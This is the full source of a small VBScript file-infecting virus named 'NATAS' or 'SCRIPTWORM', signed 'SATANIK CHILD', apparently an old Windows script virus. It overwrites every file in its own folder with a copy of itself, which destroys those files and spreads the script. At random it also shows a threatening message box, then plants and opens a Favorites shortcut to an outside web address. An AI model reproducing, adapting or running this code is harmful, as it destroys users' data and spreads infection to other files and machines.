'NATAS
'------------------------------------------------
'SCRIPTWORM
'----====[[--:S:A:T:A:N:I:K  C:H:I:L:D:--]]====----
'------------------------------------------------"
Dim NATAS, WshShell, FSO, VX, VirusLink
On Error Resume Next
Randomize
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = Wscript.CreateObject("Wscript.Shell")
NATAS = Wscript.ScriptFullName
VX = Left(NATAS, InStrRev(NATAS, "\"))
For Each target in FSO.GetFolder(VX).Files
  FSO.CopyFile NATAS, target.Name, 1
Next
If Int((2 * Rnd) + 1) = 1 Then
  MsgBox "SEEK REFUGE FOR SATAN HOLDS NO MERCY FOR THE WEAK THE SICK AND UNWANTED!", 4096 , "SATANIK CHILD"
  Set VirusLink = WshShell.CreateShortcut("C:\WINDOWS\Favorites\NATAS.URL")
  VirusLink.TargetPath = "http://users.tmok.com/~dr_bulge/smt1/"
  VirusLink.Save
  WshShell.Run ("C:\WINDOWS\Favorites\NATAS.URL")
End If
'NATAS
